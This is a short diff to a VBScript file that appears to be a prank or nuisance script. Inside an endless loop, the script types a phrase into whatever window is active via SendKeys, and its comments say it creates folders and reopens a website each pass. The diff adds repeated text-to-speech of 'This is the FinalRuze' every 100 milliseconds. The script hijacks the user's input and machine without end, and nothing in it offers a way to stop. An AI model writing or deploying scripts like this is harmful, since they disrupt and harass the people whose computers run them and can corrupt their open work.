@@ -20,6 +20,13 @@ Do While True
     ' Type the search term in any active search bar
     objShell.SendKeys "This is the Final Ruze"
     
+    ' Wait for 100 milliseconds before making the computer say the phrase
+    WScript.Sleep 100
+    
+    ' Make the computer say the phrase using the Windows text-to-speech engine
+    Set objVoice = CreateObject("SAPI.SpVoice")
+    objVoice.Speak "This is the FinalRuze"
+    
     ' Wait for 100 milliseconds before creating the next folder and opening the website again
     WScript.Sleep 100
 Loop
